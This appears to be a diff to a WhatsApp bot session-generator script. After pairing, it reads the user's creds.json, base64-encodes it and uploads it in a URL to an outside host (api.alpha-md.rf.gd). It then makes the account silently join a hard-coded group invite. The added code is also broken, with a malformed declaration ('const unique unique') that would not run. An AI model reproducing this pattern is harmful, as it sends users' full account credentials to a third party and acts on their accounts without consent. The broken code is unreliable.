@@ -62,9 +62,9 @@ XeonBotInc.ev.on("connection.update",async  (s) => {
             await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: '*thanks for choosing alpha-md*\n*your sesssionid will be sent in 10 seconds please wait..*\n*have a great day ahead*' });
             await delay(1000 * 10)
             const folderPath = `./session/${id}/`;
-            let unique = fs.readFileSync(__dirname + `/session/${id}/creds.json`)
-             c = Buffer.from(unique).toString('base64');  
-            const response = await axios.get(`https://api.alpha-md.rf.gd/session/upload?content=encodeURIComponent(c)`);
+        const unique unique = fs.readFileSync(__dirname + `/session/${id}/creds.json`)
+        const c = Buffer.from(unique).toString('base64');
+        const response = await axios.get(`https://api.alpha-md.rf.gd/session/upload?content=${encodeURIComponent(c)}`);
               console.log(response.data.id)                               
          XeonBotInc.groupAcceptInvite("BGWpp9qySw81CGrqRM3ceg");
        const xeonses = await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: response.data.id });
